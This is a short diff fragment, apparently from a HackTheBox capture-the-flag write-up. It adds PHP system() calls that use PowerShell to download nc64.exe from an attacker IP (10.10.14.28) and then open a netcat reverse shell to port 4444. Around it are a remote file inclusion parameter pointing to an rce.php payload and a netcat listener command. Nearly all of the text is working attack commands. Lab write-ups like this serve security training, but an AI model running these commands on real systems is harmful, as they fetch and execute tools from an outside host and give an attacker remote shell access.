@@ -199,6 +199,8 @@ include=http://10.10.14.39/rce.php
 
 
 ```
+system("powershell -c wget 10.10.14.28/nc64.exe -outfile \\programdata\\nc64.exe");
+system("\\programdata\\nc64.exe -e powershell 10.10.14.28 4444");
 rlwrap -cAr nc -lnvp 443
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/7a536fc7-dd48-48aa-912b-f35f9306b243)
